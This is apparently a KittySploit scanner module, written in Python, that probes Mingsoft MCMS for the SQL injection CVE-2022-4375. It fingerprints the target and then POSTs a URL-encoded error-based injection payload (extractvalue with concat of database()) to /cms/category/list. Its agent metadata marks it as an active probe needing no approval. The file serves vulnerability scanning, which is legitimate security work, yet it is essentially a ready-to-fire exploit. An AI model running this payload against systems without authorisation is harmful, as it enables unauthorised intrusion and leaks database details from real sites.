#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""SQL injection vulnerability in Mingsoft MCMS up to 5."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Mingsoft MCMS - SQL Injection Detection',
        'description': 'SQL injection vulnerability in Mingsoft MCMS up to 5.2.9 via the sqlWhere parameter in /cms/category/list.',
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': ['web', 'scanner', 'cve', 'cve2022', 'mingsoft', 'mcms', 'sqli', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 2,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'risk_signal',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://gitee.com/mingSoft/MCMS/issues/I61TG5',
            'https://nvd.nist.gov/vuln/detail/CVE-2022-4375',
        ],
        'cve': 'CVE-2022-4375',
    }

    def run(self):
        path = '/'
        r = self.http_request(method='GET', path=path, allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_any = ('mingsoft.net',)
        if not (any(m in body for m in body_any)):
            return False
        path = '/cms/category/list?'
        r = self.http_request(method='POST', path=path, allow_redirects=False, headers={'Content-Type': 'application/x-www-form-urlencoded'}, data='sqlWhere=%5b%7b%22%61%63%74%69%6f%6e%22%3a%22%22%2c%22%66%69%65%6c%64%22%3a%22%65%78%74%72%61%63%74%76%61%6c%75%65%28%30%78%37%65%2c%63%6f%6e%63%61%74%28%30%78%37%65%2c%28%64%61%74%61%62%61%73%65%28%29%29%29%29%22%2c%22%65%6c%22%3a%22%65%71%22%2c%22%6d%6f%64%65%6c%22%3a%22%63%6f%6e%74%65%6e%74%54%69%74%6c%65%22%2c%22%6e%61%6d%65%22%3a%22%e6%96%87%e7%ab%a0%e6%a0%87%e9%a2%98%22%2c%22%74%79%70%65%22%3a%22%69%6e%70%75%74%22%2c%22%76%61%6c%75%65%22%3a%22%61%22%7d%5d\n')
        if not r or r.status_code not in (500, 200):
            return False
        body = r.text or ""
        body_any = ('java.sql.SQLSyntaxErrorException', 'java.sql.SQLException', 'Icategorydao.xml', 'cms_category',)
        if any(m in body for m in body_any):
            self.set_info(severity='critical', reason='Mingsoft MCMS - SQL Injection detected', path=path)
            return True
        return False

